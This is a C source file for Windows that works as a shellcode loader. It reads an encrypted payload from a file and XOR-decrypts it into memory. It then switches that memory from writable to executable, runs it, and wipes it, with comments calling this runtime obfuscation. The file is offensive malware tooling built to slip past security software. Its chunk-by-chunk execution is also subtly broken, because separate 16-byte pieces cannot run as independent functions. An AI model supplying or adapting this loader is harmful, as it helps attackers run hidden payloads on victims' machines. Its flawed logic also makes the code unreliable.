#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// A function to execute a single chunk of the shellcode
void execute_chunk(unsigned char *chunk, size_t chunk_len, unsigned char key) {
    // Allocate memory for the chunk
    void *exec_mem = VirtualAlloc(NULL, chunk_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed with error %lu\n", GetLastError());
        return;
    }

    // Decrypt the chunk into the allocated memory
    unsigned char *decrypted = (unsigned char *)exec_mem;
    for (size_t i = 0; i < chunk_len; i++) {
        decrypted[i] = chunk[i] ^ key; // XOR decryption
    }

    // Change memory permissions to EXECUTE_READ
    DWORD old_protect;
    if (!VirtualProtect(exec_mem, chunk_len, PAGE_EXECUTE_READ, &old_protect)) {
        fprintf(stderr, "VirtualProtect failed with error %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    // Execute the chunk
    ((void(*)())exec_mem)();

    // Wipe and free memory
    SecureZeroMemory(exec_mem, chunk_len);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

int main() {
    FILE *file;
    unsigned char *shellcode;
    size_t shellcode_len;

    // Open the obfuscated shellcode file
    file = fopen("obfuscated_shellcode.raw", "rb");
    if (file == NULL) {
        fprintf(stderr, "Failed to open file\n");
        return 1;
    }

    // Get the size of the shellcode
    fseek(file, 0, SEEK_END);
    shellcode_len = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory for the shellcode
    shellcode = (unsigned char *)malloc(shellcode_len);
    if (shellcode == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        return 1;
    }

    // Read the shellcode into memory
    fread(shellcode, 1, shellcode_len, file);
    fclose(file);

    // Example XOR key (use a random key in real implementations)
    unsigned char key = 0x5A;

    // Runtime obfuscation: Split shellcode into chunks
    size_t chunk_size = 16; // Process 16 bytes at a time
    for (size_t i = 0; i < shellcode_len; i += chunk_size) {
        size_t current_chunk_size = (i + chunk_size > shellcode_len) ? (shellcode_len - i) : chunk_size;
        execute_chunk(shellcode + i, current_chunk_size, key);
    }

    // Free the memory used for storing the encrypted shellcode
    free(shellcode);

    return 0;
}
